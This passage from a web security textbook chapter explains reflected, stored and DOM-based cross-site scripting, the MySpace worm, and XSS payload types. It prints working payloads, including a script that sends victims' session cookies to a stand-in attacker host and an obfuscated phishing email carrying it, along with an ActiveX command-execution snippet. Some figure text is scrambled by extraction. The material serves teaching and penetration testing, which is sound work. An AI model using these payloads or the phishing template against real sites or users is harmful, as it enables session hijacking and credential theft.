conflated or neglected even by some seasoned penetration\ntesters. We will describe all of the different vulnerabilities that are commonly\nencountered and spell out the practical steps you need to perform to identify\nand exploit each of these.\nCross-Site Scripting\nCross-site scripting (or XSS) is the Godfather of attacks against other users. It\nis by some measure the most prevalent web application vulnerability found in\nthe wild, afflicting literally the vast majority of live applications, including\nsome of the most security-critical applications on the Internet, such as those\nused by online banks.\nOpinions vary as to the seriousness of XSS vulnerabilities. Ask many a\nhacker or professional pen tester, and they will tell you, “Cross-site scripting is\nlame.” And in one sense it is. XSS vulnerabilities are often trivial to identify\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 377\nChapter 12 ■ Attacking Other Users 377\nand are so widespread that anyone with a browser can find an XSS bug some-\nwhere in a matter of minutes. The Bugtraq mailing list is congested with atten-\ntion seekers posting XSS bugs in unheard-of software. And in plenty of cases,\nXSS vulnerabilities are of minimal significance—not exploitable to do any-\nthing particularly worthwhile.\nIn the archetypal battle between a lone hacker and a target web application,\nXSS bugs usually (though not always) provide no help in the hacker’s quest to\ncompromise the system. Compared with a juicy bug like SQL injection, path\ntraversal, or broken access controls, cross-site scripting is often “lame” indeed.\nHowever, the significance of any bug is dependent upon both its context\nand the objectives of the person who might exploit it. An XSS bug in a banking\napplication is considerably more serious than one in a brochure-ware site.\nEven if the bug does not enable a hacker to break in, it may still be gold dust to\na phisherman seeking to hoodwink millions of unwitting users.\nFurther, there are many situations in which XSS does represent a critical\nsecurity weakness within an application. It can often be combined with other\nvulnerabilities to devastating effect. In some situations, an XSS attack can be\nturned into a virus or a self-propagating worm. Attacks of this kind are cer-\ntainly not lame.\nXSS vulnerabilities should always be viewed in perspective, by reference to\nthe context in which they appear, and in relation to other serious attacks\nagainst web applications and other computer systems. We need to treat them\nseriously, but avoid getting over-excited. Whatever your opinion of the threat\nposed by XSS vulnerabilities, it seems unlikely that Al Gore will be producing\na movie about them any time soon.\nCOMMON MYTH “You can’t own a web application via XSS.”\nThe authors have owned numerous applications using only XSS attacks. In the\nright situation, a skillfully exploited XSS vulnerability can lead directly to a\ncomplete compromise of the application. We will show you how.\nReflected XSS Vulnerabilities\nA very common example of XSS occurs when an application employs\na dynamic page to display error messages to users. Typically, the page takes a\nparameter containing the text of the message, and simply renders this text\nback to the user within its response. This type of mechanism is convenient for\ndevelopers, because it allows them to invoke a customized error page from\nanywhere in the application, without needing to hard-code individual mes-\nsages within the error page itself.\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 378\n378 Chapter 12 ■ Attacking Other Users\nFor example, consider the following URL, which returns the error message\nshown in Figure12-1:\nhttps://wahh-app.com/error.php?message=Sorry%2c+an+error+occurred\nFigure12-1: A dynamically generated error message\nLooking at the HTML source for the returned page, we can see that the\napplication is simply copying the value of the message parameter in the URL\nand inserting this into the error page template at the appropriate place:\n<p>Sorry, an error occurred.</p>\nThis behavior of taking user-supplied input and inserting it into the HTML\nof the server’s response is one of the signatures of XSS vulnerabilities, and if no\nfiltering or sanitization is being performed, then the application is certainly\nvulnerable. Let’s see how.\nThe following URL has been crafted to replace the error message with a\npiece of JavaScript that generates a pop-up dialog:\nhttps://wahh-app.com/error.php?message=<script>alert(‘xss’);</script>\nRequesting this URL generates an HTML page that contains the following in\nplace of the original message:\n<p><script>alert(‘xss’);</script></p>\nAnd sure enough, when the page is rendered within the user’s browser, the\npop-up message appears, as shown in Figure12-2.\nFigure12-2: A proof-of-concept XSS exploit\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 379\nChapter 12 ■ Attacking Other Users 379\nPerforming this simple test serves to verify two important things. First, the\ncontents of the messageparameter can be replaced with arbitrary data that gets\nreturned to the browser. Second, whatever processing the server-side applica-\ntion is performing on this data (if any), it is not sufficient to prevent us from\nsupplying JavaScript code that is executed when the page is displayed in the\nbrowser.\nThis type of simple XSS bug accounts for approximately 75% of the XSS vul-\nnerabilities that exist in real-world web applications. It is often referred to as\nreflected XSS because exploiting the vulnerability involves crafting a request\ncontaining embedded JavaScript which is reflected back to any user who makes\nthe request. The attack payload is delivered and executed via a single request\nand response. For this reason, it is also sometimes referred to as first-orderXSS.\nExploiting the Vulnerability\nAs you will see, XSS vulnerabilities can be exploited in many different ways to\nattack other users of an application. One of the simplest attacks, and the one\nthat is most commonly envisaged to explain the potential significance of XSS\nflaws, results in the attacker capturing the session token of an authenticated\nuser. Hijacking the user’s session gives the attacker access to all of the data and\nfunctionality to which the user is authorized (see Chapter 7).\nThe steps involved in this attack are illustrated in Figure12-3.\nApplication\nRL\n3. 1 U . s U e 4 r s . e r e S r q e lo a u r t v g e t e s s a r t c i s k n r e e a s r t ’ t p s a o c J n k a d e v s r a ’ s S w c U i r th ip t 7. A ttacker hijacks user’s session\n5. Attacker’s\nJavaScript\nexecutes in 2. Attacker feeds crafted URL to user\nuser’s browser\n6. User’s browser sends session token to attacker\nUser Attacker\nFigure12-3: The steps involved in a reflected XSS attack\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 380\n380 Chapter 12 ■ Attacking Other Users\n1. The user logs in to the application as normal, and is issued with a\ncookie containing a session token:\nSet-Cookie: sessId=184a9138ed37374201a4c9672362f12459c2a652491a3\n2. Through some means (described in detail later), the attacker feeds the\nfollowing URL to the user:\nhttps://wahhapp.com/error.php?message=<script>var+i=new+Image;\n+i.src=”http://wahh-attacker.com/“%2bdocument.cookie;</script>\nAs in the previous example, which generated a dialog message, this\nURL contains embedded JavaScript. However, the attack payload in\nthis case is more malicious.\n3. The user requests from the application the URL fed to them by the\nattacker.\n4. The server responds to the user’s request. As a result of the XSS vulner-\nability, the response contains the JavaScript created by the attacker.\n5. The attacker’s JavaScript is received by the user’s browser, which\nexecutes it in the same way it does any other code received from the\napplication.\n6. The malicious JavaScript created by the attacker is:\nvar i=new Image; i.src=”http://wahh-attacker.com/“+document.cookie;\nThis code causes the user’s browser to make a request to wahh-\nattacker.com, which is a domain owned by the attacker. The request\ncontains the user’s current session token for the application:\nGET /sessId=184a9138ed37374201a4c9672362f12459c2a652491a3 HTTP/1.1\nHost: wahh-attacker.com\n7. The attacker monitors requests to wahh-attacker.comand receives the\nuser’s request. He uses the captured token to hijack the user’s session,\ngaining access to that user’s personal information, and performing arbi-\ntrary actions “as” the user.\nNOTE As you saw in Chapter 6, some applications store a persistent cookie\nwhich effectively reauthenticates the user on each visit—for example, to\nimplement a “remember me” function. In this situation, step 1 of the preceding\nprocess is not necessary. The attack will succeed even at times when the target\nuser is not actively using or logged in to the application. Because of this,\napplications that use cookies in this way leave themselves more exposed in\nterms of the impact of any XSS flaws that they contain.\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 381\nChapter 12 ■ Attacking Other Users 381\nAfter following all of this, you may be forgiven for wondering why, if the\nattacker is able to induce the user to visit a URL of his choosing, he bothers\nwith the whole rigmarole of transmitting his malicious JavaScript via the XSS\nbug in the vulnerable application. Why doesn’t he simply host a malicious\nscript on wahh-attacker.com and feed the user a direct link to this script?\nWouldn’t this script execute in just the same way as it does in the example\ndescribed?\nIn fact, there are two important reasons why the attacker goes to the trouble\nof exploiting the XSS vulnerability. The first and most important reason is that\nthe attacker’s objective is not simply to execute an arbitrary script but to cap-\nture the session token of the user. Browsers do not let just any old script access\na site’s cookies; otherwise, session hijacking would be trivial. Rather, cookies\ncan be accessed only by the site that issued them: they are submitted in HTTP\nrequests back to the issuing site only, and they can be accessed via JavaScript\ncontained within or loaded by a page returned by that site only. Hence, if a\nscript residing on wahh-attacker.com queries document.cookie, it will not\nobtain the cookies issued by wahh-app.com, and the hijacking attack will fail.\nThe reason why the attack which exploits the XSS vulnerability is successful\nis that, as far as the user’s browser is concerned, the attacker’s malicious\nJavaScript wassent to it by wahh-app.com. When the user requests the attacker’s\nURL, the browser makes a request to https://wahh-app.com/error.php, and\nthe application returns a page containing some JavaScript. As with any\nJavaScript received from wahh-app.com, the browser executes this script within\nthe security context of the user’s relationship with wahh-app.com. This is the\nreason why the attacker’s script, although it actually originates elsewhere, is\nable to gain access to the cookies issued by wahh-app.com. This is also the rea-\nson why the vulnerability itself has become known as cross-site scripting.\nNOTE This restriction on the data that individual scripts can access is part of\na more general same origin policyimplemented by all modern browsers. This\npolicy is designed to place barriers between different web sites that are being\naccessed by the browser, to prevent them from interfering with each other. The\nmain features of the policy that you need to be aware of are:\n■■ A page residing on one domain can cause an arbitrary request to be\nmade to another domain (for example, by submitting a form or loading\nan image), but it cannot itself process the data returned from that\nrequest.\n■■ A page residing on one domain can load a script from another domain\nand execute this within its own context. This is because scripts are\nassumed to contain code, rather than data, and so cross-domain access\nshould not lead to disclosure of any sensitive information. As you will\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 382\n382 Chapter 12 ■ Attacking Other Users\nsee, this assumption breaks down in certain situations, leading to\ncross-domain attacks.\n■■ A page residing on one domain cannot read or modify the cookies or\nother DOM data belonging to another domain (as described in the\nprevious example).\nThe second reason why the attacker goes to the trouble of exploiting the XSS\nvulnerability is that step 2 of the process just described is far likelier to succeed\nif the URL crafted by the attacker starts with wahh-app.comrather than wahh-\nattacker.com. Suppose that the attacker attempts to snare his victims by send-\ning out millions of emails like the following:\nFrom: “WahhApp Customer Services” <customerservices@wahh-app.com>\nTo: “John Smith”\nSubject: Complete our customer survey and receive a $5 credit\nDear Valued Customer,\nYou have been selected to participate in our customer survey. Please\ncomplete our easy 5 question survey, and in return we will credit $5 to\nyour account.\nTo access the survey, please log in to your account using your usual\nbookmark, and then click on the following link:\nhttps://wahh-app.com/%65%72%72%6f%72%2e%70%68%70?message%3d%3c%73%63\n%72ipt>var+i=ne%77+Im%61ge%3b+i.s%72c=”ht%74%70%3a%2f%2f%77ahh-att\n%61%63%6ber.co%6d%2f”%2bdocum%65%6e%74%2e%63ookie;</%73%63ript%3e\nMany thanks and kind regards,\nWahh-App Customer Services\nEven to someone who is aware of the threats posed by phishing-style scams,\nthis email is actually fairly reassuring:\n■■ They are told to access their account using their usual bookmark.\n■■ The link they are invited to click on points to the correct domain name\nused by the application.\n■■ The URL has been obfuscated from the version in step 2, by URL-\nencoding selected characters so that its malicious intent is not immedi-\nately obvious.\n■■ The HTTPS security check will succeed, because the URL provided by\nthe attacker is actually delivered by the authentic wahh-app.comserver.\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 383\nChapter 12 ■ Attacking Other Users 383\nIf the attacker did not exploit the XSS vulnerability, but instead performed a\npure phishing attack by offering a link to his own malicious web server, many\nless gullible users would suspect that it was a scam, and the attack would be\nfar less successful.\nCOMMON MYTH “Phishing scams are a fact of life on the Internet, and I\ncan’t do anything about them. There is no point wasting time trying to fix the\nXSS bugs in my application.”\nPhishing attacks and XSS vulnerabilities are entirely different phenomena. Pure\nphishing scams involve creating a clone of a target application and somehow\ninducing users to interact with it. XSS attacks, on the other hand, may be\ndelivered entirely via the vulnerable application being targeted. Many people\nget confused between XSS and phishing because the methods used for delivery\nare sometimes similar. However, there are several key points that make XSS a\nmuch higher risk to organizations than phishing:\n■■ Because XSS attacks execute within the authentic application, the user\nwill see personalized information relating to them, such as account\ninformation or a “welcome back” message. Cloned web sites are not\npersonalized.\n■■ The cloned web sites used in phishing attacks are usually identified\nand shut down quickly.\n■■ Many browsers and anti-malware products contain a phishing filter\nthat protects users from malicious cloned sites.\n■■ Most banks won’t take responsibility if their customers visit a cloned\nweb site. They cannot disassociate themselves so easily if customers\nare attacked via an XSS flaw in their own application.\n■■ As you will see, there are ways of delivering XSS attacks that do not\nuse phishing-style techniques.\nStored XSS Vulnerabilities\nA different category of XSS vulnerability is often referred to as storedcross-site\nscripting. This version arises when data submitted by one user is stored within\nthe application (typically in a back-end database) and then displayed to other\nusers without being filtered or sanitized appropriately.\nStored XSS vulnerabilities are common in applications that support interac-\ntion between end users, or where administrative staff access user records and\ndata within the same application. For example, consider an auction applica-\ntion that allows buyers to post questions about specific items, and sellers to\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 384\n384 Chapter 12 ■ Attacking Other Users\npost responses. If a user can post a question containing embedded JavaScript,\nand the application does not filter or sanitize this, then an attacker can post a\ncrafted question that causes arbitrary scripts to execute within the browser of\nanyone who views the question, including both the seller and other potential\nbuyers. In this context, the attacker could potentially cause unwitting users to\nbid on an item without intending to, or cause a seller to close an auction and\naccept the attacker’s low bid for an item.\nAttacks against stored XSS vulnerabilities typically involve at least two\nrequests to the application. In the first, the attacker posts some crafted data\ncontaining malicious code that gets stored by the application. In the second, a\nvictim views some page containing the attacker’s data, at which point the\nmalicious code is executed. For this reason, the vulnerability is also sometimes\nreferred to as second-ordercross-site scripting. (In this instance, “XSS” is really\na misnomer, as there is no cross-site element to the attack. The name is widely\nused, however, so we will retain it here.)\nFigure12-4 illustrates how an attacker can exploit a stored XSS vulnerability\nto perform the same session hijacking attack as was described for reflected XSS.\n3. U 2 s . e U r 4 s v . e i S r e w e lo a r s t v g t e s a a r t c i t k n r a e e c s r k ’ p s e o r J ’ n s a d v q s a u S w e c s i r t t h i i p o t n\nApplication\n7. A t c ta o c n k t 1 e a . r i n A h in t ij t g a a c c m k k s e a r l u i c s s i u e o b r u ’ m s s s i J t e s a s v q s a u i S o e c n s r t i i p o t n\n5. Attacker’s\nJavaScript\nexecutes in\nuser’s browser\n6. User’s browser sends session token to attacker\nUser Attacker\nFigure12-4: The steps involved in a stored XSS attack\nThere are two important differences in the attack process between reflected\nand stored XSS, which make the latter generally more serious from a security\nperspective.\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 385\nChapter 12 ■ Attacking Other Users 385\nFirst, in the case of reflected XSS, to exploit a vulnerability the attacker must\nuse some means of inducing victims to visit his crafted URL. In the case of\nstored XSS, this requirement is avoided. Having deployed his attack within\nthe application, the attacker simply needs to wait for victims to browse to the\npage or function that has been compromised. In general, this will be a regular\npage of the application that normal users will access of their own accord.\nSecond, the attacker’s objectives in exploiting an XSS bug are usually\nachieved much more easily if the victim is using the application at the time of\nthe attack. For example, if the user has an existing session, this can be immedi-\nately hijacked. In a reflected XSS attack, the attacker may try to engineer this\nsituation by persuading the user to log in and then click on a link that he sup-\nplies, or he may attempt to deploy a persistent payload that waits until the\nuser logs in. However, in a stored XSS attack, it is usually guaranteed that vic-\ntim users will be already accessing the application at the time that the attack\nstrikes. Because the attack payload is stored within a page of the application\nthat users access of their own accord, any victim of the attack will by definition\nbe using the application at the moment the payload executes. Further, if the\npage concerned is within the authenticated area of the application, then any\nvictim of the attack must in addition be logged in at the time.\nThese differences between reflected and stored XSS mean that stored XSS\nflaws are often critical to an application’s security. In most cases, an attacker\ncan submit some crafted data to the application and then wait for victims to be\nhit. If one of those victims is an administrator, then the attacker will have com-\npromised the entire application.\nStoring XSS in Uploaded Files\nOne common, but frequently overlooked, source of stored XSS vulnerabilities\narises where an application allows users to upload files that can be down-\nloaded and viewed by other users. If you can upload an HTML or text file con-\ntaining JavaScript, and a victim views the file, then your payload will\nnormally be executed.\nMany applications disallow the uploading of HTML files to prevent this\nkind of attack; however, in most cases they allow files containing JPEG images.\nIn Internet Explorer, if a user requests a JPEG file directly (not via an embed-\nded <img>tag), then the browser will actually process its contents as HTML if\nthis is what the file contains. This behavior means that an attacker can upload\na file with the .jpg extension containing an XSS payload. If the application\ndoes not verify that the file actually contains a valid image, and allows other\nusers to download the file, then it is vulnerable.\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 386\n386 Chapter 12 ■ Attacking Other Users\nThe following shows the raw response of an application that is vulnerable to\nstored XSS in this way. Note that even though the Content-Typeheader speci-\nfies that the message body contains an image, Internet Explorer overrides this\nand handles the content as HTML because this is what it in fact contains.\nHTTP/1.1 200 OK\nDate: Sat, 5 May 2007 11:52:25 GMT\nServer: Apache\nContent-Length: 39\nContent-Type: image/jpeg\n<script>alert(document.cookie)</script>\nThis vulnerability exists in many web mail applications, where an attacker\ncan send emails containing a seductive-sounding image attachment that in\nfact compromises the session of any user who views it. Many such applica-\ntions sanitize HTML attachments specifically to block XSS attacks, but over-\nlook the way Internet Explorer handles JPEG files.\nDOM-Based XSS Vulnerabilities\nBoth reflected and stored XSS vulnerabilities involve a specific pattern of\nbehavior, in which the application takes user-controllable data and displays\nthis back to users in an unsafe way. A third category of XSS vulnerabilities does\nnot share this characteristic. Here, the process by which the attacker’s\nJavaScript gets executed is as follows:\n■■ A user requests a crafted URL supplied by the attacker and containing\nembedded JavaScript.\n■■ The server’s response does not contain the attacker’s script in any form.\n■■ When the user’s browser processes this response, the script is executed\nnonetheless.\nHow can this series of events occur? The answer is that client-side JavaScript\ncan access the browser’s document object model (DOM), and so can determine\nthe URL used to load the current page. A script issued by the application may\nextract data from the URL, perform some processing on this data, and then use\nit to dynamically update the contents of the page. When an application does\nthis, it may be vulnerable to DOM-based XSS.\nRecall the original example of a reflected XSS flaw, in which the server-side\napplication copies data from a URL parameter into an error message. A differ-\nent way of implementing the same functionality would be for the application\nto return the same piece of static HTML on every occasion and to use client-\nside JavaScript to dynamically generate the message’s contents.\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 387\nChapter 12 ■ Attacking Other Users 387\nFor example, suppose that the error page returned by the application con-\ntains the following:\n<script>\nvar a = document.URL;\na = unescape(a);\ndocument.write(a.substring(a.indexOf(“message=”) + 8, a.length));\n</script>\nThis script parses the URL to extract the value of the messageparameter and\nsimply writes this value into the HTML source code of the page. When\ninvoked as the developers intended, it can be used in the same way as in the\noriginal example to create error messages easily. However, if an attacker crafts\na URL containing JavaScript code as the value of the messageparameter, then\nthis code will be dynamically written into the page and executed in just the\nsame way as if it had been returned by the server. In this example,\nthe same URL that exploited the original reflected XSS vulnerability can also\nbe used to produce a dialog box:\nhttps://wahh-app.com/error.php?message=<script>alert(‘xss’);</script>\nThe process of exploiting a DOM-based XSS vulnerability is illustrated in\nFigure12-5.\nApplication\nRL\n3. 1 U . s U er 4 s c e . r o e r S q n l e o u t r a g e v i s s n e t r i i s n n r g e a s t h t p a a o c rd n ke - d c r s ’ o s w d U e it d h J p a a v g a e S cript 7. A ttacker hijacks user’s session\n5. Attacker’s\nURL is processed\nby JavaScript, 2. Attacker feeds crafted URL to user\ntriggering\nhis attack 6. User’s browser sends session token to attacker\npayload\nUser Attacker\nFigure12-5: The steps involved in a DOM-based XSS attack\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 388\n388 Chapter 12 ■ Attacking Other Users\nDOM-based XSS vulnerabilities are more similar to reflected than to stored\nXSS bugs. Their exploitation typically involves an attacker inducing a user to\naccess a crafted URL containing malicious code, and it is the server’s response\nto that specific request that causes the malicious code to be executed. How-\never, in terms of the details of exploitation, there are important differences\nbetween reflected and DOM-based XSS, which we will examine shortly.\nReal-World XSS Attacks\nThe features that make stored XSS vulnerabilities potentially very serious are\nevident in real-world examples of exploitation in the wild.\nWeb mail applications are inherently at risk of stored XSS attacks, because of\nthe way they render email messages in-browser when viewed by the recipient.\nEmails may contain HTML-formatted content, and so the application is effec-\ntively copying third-party HTML into the pages that it displays to users. If an\nattacker can send a victim an HTML-formatted email containing malicious\nJavaScript, and if this does not get filtered or sanitized by the application, then\nthe victim’s web mail account may be compromised solely by reading the email.\nApplications like Hotmail implement numerous filters to prevent JavaScript\nembedded within emails from being transmitted to the recipient’s browser.\nHowever, various bypasses to these filters have been discovered over the years,\nenabling an attacker to construct a crafted email that succeeds in executing arbi-\ntrary JavaScript when viewed within the web mail application. Because any\nuser reading such an email is guaranteed to be logged in to the application at\nthe time, the vulnerability is potentially devastating to the application.\nThe social networking site MySpace was found to be vulnerable to a stored\nXSS attack in 2005. The MySpace application implements filters to prevent\nusers from placing JavaScript into their user profile page. However, a user\ncalled Samy found a means of circumventing these filters, and placed some\nJavaScript into his profile page. The script executed whenever a user viewed\nthis profile and caused the victim’s browser to perform various actions with\ntwo key effects. First, it added the perpetrator as a “friend” of the victim. Sec-\nond, it copied the script into the victim’s own user profile page. Subsequently,\nanyone who viewed the victim’s profile would also fall victim to the attack. To\nperform the various requests required, the attack used Ajax techniques (see the\n“Ajax” sidebar at the end of this section). The result was an XSS-based worm\nthat spread exponentially, and within hours the original perpetrator had\nnearly one million friend requests, as shown in Figure12-6.\nAs a result, MySpace was obliged to take the application offline, remove the\nmalicious script from the profiles of all their users, and fix the defect in their\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 389\nChapter 12 ■ Attacking Other Users 389\nanti-XSS filters. The perpetrator was eventually forced to pay financial restitu-\ntion to MySpace and to carry out three months of community service, without\nthe help of his many friends.\nFigure12-6: Samy’s friends\nAJAX\nAjax (or Asynchronous JavaScript and XML) is a technology used by some\napplications to create an enhanced interactive experience for users. In most\nweb applications, each user action (such as clicking a link or submitting a form)\nresults in a new HTML page being loaded from the server. The entire browser\ncontent disappears and is replaced with new content, even if much of this is\nidentical to what was there before. This way of operating creates a punctuated\nuser experience and differs greatly from the behavior of local applications such\nas email clients and other office software.\nContinued\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 390\n390 Chapter 12 ■ Attacking Other Users\nAJAX (continued)\nAjax enables web developers to implement a user interface whose behavior\nis much closer to that of local software. User actions may still trigger a round\ntrip of request and response to the server; however, the entire web page is not\nreloaded each time this occurs. Rather, the request does not occur as a browser\nnavigation event but is made asynchronously by client-side JavaScript. The\nserver responds with a lightweight message containing information in XML,\nJSON, or any other format, which is processed by the client-side script and used\nto update the user interface accordingly. For example, in a shopping applica-\ntion, clicking the Add to Basket button may simply involve communicating this\naction to the server and updating the “Your basket contains X items” message\nat the top of the screen. The page itself is not reloaded, resulting in a much\nsmoother and more satisfying experience for the user.\nAjax is implemented using the XMLHttpRequestobject. This object comes in\nseveral forms depending on the browser, but these all function in fundamen-\ntally the same way. The following is a simple example of using Ajax within\nInternet Explorer to issue an asynchronous request and process its response:\n<script>\nvar request = new ActiveXObject(“Microsoft.XMLHTTP”);\nrequest.open(“GET”, “https://wahh-app.com/foo”, false);\nrequest.send();\nalert(request.responseText);\n</script>\nOne very important proviso affecting the use of XMLHttpRequestis that it\ncan only be used to issue requests to the same domain as the page that is\ninvoking it. Without this restriction, Ajax could be used to trivially violate the\nbrowser’s same origin policy, by enabling applications to retrieve and process\ndata from a different domain.\nChaining XSS and Other Attacks\nXSS flaws can sometimes be chained with other vulnerabilities to devastating\neffect. The authors encountered an application that had a stored XSS vulnera-\nbility within the user’s display name. The only purpose for which this item\nwas used was to show a personalized welcome message after the user logged\nin. The display name was never displayed to other application users, so there\ninitially appeared to be no attack vector for users to cause problems by editing\ntheir own display name. Other things being equal, the vulnerability would be\nclassified as very low risk.\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 391\nChapter 12 ■ Attacking Other Users 391\nHowever, a second vulnerability existed within the application. Defective\naccess controls meant that any user could edit the display name of any other\nuser. Again, on its own, this issue had minimal significance: Why would an\nattacker be interested in changing the display name of other users?\nChaining these two low-risk vulnerabilities together enabled an attacker to\ncompletely compromise the application. It was trivial to automate an attack\nto inject a script into the display name of every application user. This script\nexecuted every time a user logged in to the application, and transmitted the\nuser’s session token to a server owned by the attacker. Some of the applica-\ntion’s users were administrators, who logged in frequently and had the abil-\nity to create new users and modify the privileges of other users. An attacker\nsimply had to wait for an administrator to log in, hijack the administrator’s\nsession, and then upgrade their own account to have administrative privi-\nleges. The two vulnerabilities together represented a critical risk to the secu-\nrity of the application.\nCOMMON MYTH “We’re not worried about that low-risk XSS bug—a user\ncould only exploit it to attack themselves.”\nAs the example illustrates, even apparently low-risk vulnerabilities can in the\nright circumstances pave the way for a devastating attack. Taking a defense-\nin-depth approach to security entails removing every known vulnerability,\nhowever insignificant it may seem. Always assume that an attacker will be\nmore imaginative than you in devising ways to exploit minor bugs!\nPayloads for XSS Attacks\nSo far, we have focused on the classic XSS attack payload, which is to capture\na victim’s session token, hijack their session, and thereby make use of the\napplication “as” the victim, performing arbitrary actions and potentially tak-\ning ownership of that user’s account. In fact, there are numerous other attack\npayloads that may be delivered via any type of XSS vulnerability.\nVirtual Defacement\nThis attack involves injecting malicious data into a page of a web application\nto feed misleading information to users of the application. It may simply\ninvolve injecting HTML mark-up into the site, or it may use scripts (sometimes\nhosted on an external server) to inject elaborate content and navigation into\nthe site. This kind of attack is known as virtual defacement because the actual\ncontent hosted on the target’s web server is not modified—the defacement is\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 392\n392 Chapter 12 ■ Attacking Other Users\ngenerated solely because of the way the application processes and renders\nuser-supplied input.\nIn addition tofrivolous mischief, this kind of attack could be used for seri-\nous criminal purposes. A professionally crafted defacement, delivered to the\nright recipients in a convincing manner, could be picked up by the news media\nand have real-world effects on people’s behavior, stock prices, and so on, to the\nfinancial gain of the attacker, as illustrated in Figure12-7.\nFigure12-7: A virtual defacement attack exploiting an XSS flaw\nInjecting Trojan Functionality\nThis attack goes beyond virtual defacement and injects actual working func-\ntionality into the vulnerable application, designed to deceive end users into\nperforming some undesirable action, such as entering sensitive data that is\nthen transmitted to the attacker.\nAn obvious attack involving injected functionality is to present users with a\nTrojan login form that submits their credentials to a server controlled by the\nattacker. If skillfully executed, the attack may also seamlessly log the user in to\nthe real application, so that they do not detect any anomaly in their experience.\nThe attacker is then free to use the victim’s credentials for his own purposes.\nThis type of payload lends itself well to a phishing-style attack, in which users\nare fed a crafted URL within the actual authentic application and advised that\nthey will need to log in as normal to access it.\nAnother obvious attack is to ask users to enter their credit card details, usu-\nally with the inducement of some attractive offer. For example, Figure 12-8\nshows a proof-of-concept attack created by Jim Ley, exploiting a reflected XSS\nvulnerability found in Google in 2004.\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 393\nChapter 12 ■ Attacking Other Users 393\nFigure12-8: A reflected XSS attack injecting Trojan functionality\nBecause the URLs in these attacks point to the authentic domain name of the\nactual application, with a valid SSL certificate where applicable, they are far\nmore likely to persuade victims to submit sensitive information than pure\nphishing web sites that are hosted on a different domain and merely clone the\ncontent of the targeted web site.\nCOMMON MYTH “We’re not worried about any XSS bugs in the\nunauthenticated part of our site—they can’t be used to hijack sessions.”\nThis thought is erroneous for two reasons. First, an XSS bug in the\nunauthenticated part of an application can normally be used to directly\ncompromise the sessions of authenticated users. Hence, an unauthenticated\nreflected XSS flaw is typically more serious than an authenticated one, because\nthe scope of potential victims is wider. Second, even if a user is not yet\nauthenticated, an attacker can deploy some Trojan functionality which persists\nin the victim’s browser across multiple requests, waiting until they log in, and\nthen hijacking the resulting session.\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 394\n394 Chapter 12 ■ Attacking Other Users\nInducing User Actions\nIf an attacker hijacks a victim’s session, then they can use the application “as”\nthat user, and carry out any action on their behalf. However, this approach to\nperforming arbitrary actions may not always be desirable. It requires that the\nattacker monitor their own server for submissions of captured session tokens\nfrom compromised users, and it requires them to carry out the relevant action\non behalf of each and every user. If many users are being attacked, this may\nnot be practicable. Further, it leaves a rather unsubtle trace in any application\nlogs, which could be trivially used to identify the computer responsible for the\nunauthorized actions during any investigation.\nAn alternative to session hijacking, when an attacker simply wants to carry\nout a specific set of actions on behalf of each compromised user, is to use the\nattack payload script itself to perform the actions. This attack payload is partic-\nularly useful in cases where an attacker wishes to perform some action which\nrequires administrative privileges, such as modifying the permissions assigned\nto an account which he controls. With a large user base, it would be laborious to\nhijack each user’s session and establish whether the victim was an administra-\ntor. A more effective approach is to induce every compromised user to attempt\nto upgrade the permissions on the attacker’s account. Most attempts will fail,\nbut the moment an administrative user is compromised, the attacker will suc-\nceed in escalating privileges. Ways of inducing actions on behalf of other users\nare described in the “Request Forgery” section, later in this chapter.\nThe MySpace XSS worm described earlier is an example of this attack pay-\nload, and illustrates the power of such an attack to perform unauthorized\nactions on behalf of a mass user base with minimal effort by the attacker.\nAn attacker whose primary target is the application itself, but who wishes to\nremain as stealthy as possible, can leverage this type of XSS attack payload\nto cause other users to carry out malicious actions of his choosing against the\napplication. For example, the attacker could cause another user to exploit a\nSQL injection vulnerability to add a new administrator to the table of user\naccounts within the database. The attacker would control the new account, but\nany investigation of application logs may conclude that a different user was\nresponsible.\nExploiting Any Trust Relationships\nYou have already seen one important trust relationship which XSS may\nexploit: browsers trust JavaScript received from a web site with the cookies\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 395\nChapter 12 ■ Attacking Other Users 395\nissued by that web site. There are several other trust relationships that can\nsometimes be exploited in an XSS attack:\n■■ If the application employs forms with autocomplete enabled, JavaScript\nissued by the application can capture any previously entered data that\nthe user’s browser has stored in the autocomplete cache. By instantiat-\ning the relevant form, waiting for the browser to autocomplete its con-\ntents, and then querying the form field values, the script can steal this\ndata and transmit it to the attacker’s server. The same technique can\nalso be performed against the Firefox password manager to steal the\nuser’s credentials for the application. This attack can be more powerful\nthan injecting Trojan functionality, because sensitive data can be cap-\ntured without requiring any interaction by the user.\n■■ Some web applications recommend or require that users add their\ndomain name to the “Trusted Sites” zone of their browser. This is\nalmost always undesirable and means that any XSS-type flaw can be\nexploited to perform arbitrary code execution on the computer of a\nvictim user. For example, if a site is running in the Trusted Sites zone of\nInternet Explorer, then injecting the following code will cause the Win-\ndows calculator program to launch on the user’s computer:\n<script>\nvar o = new ActiveXObject(‘WScript.shell’);\no.Run(‘calc.exe’);\n</script>\n■■ Web applications often deploy ActiveX controls containing powerful\nmethods (see the “Attacking ActiveX Controls” section, later in this\nchapter). Some applications seek to prevent misuse by a third party by\nverifying within the control itself that the invoking web page was\nissued from the correct web site. In this situation, the control can still be\nmisused via an XSS attack, because in that instance the invoking code\nwill satisfy the trust check implemented within the control.\nCOMMON MYTH “Phishing and XSS only affect applications on the public\nInternet.”\nXSS bugs can affect any type of web application, and an attack against an\nintranet-based application, delivered via a group email, can exploit two forms\nof trust. First, there is the social trust exploited by an internal email sent\nbetween colleagues. Second, victims’ browsers will often trust corporate web\nservers 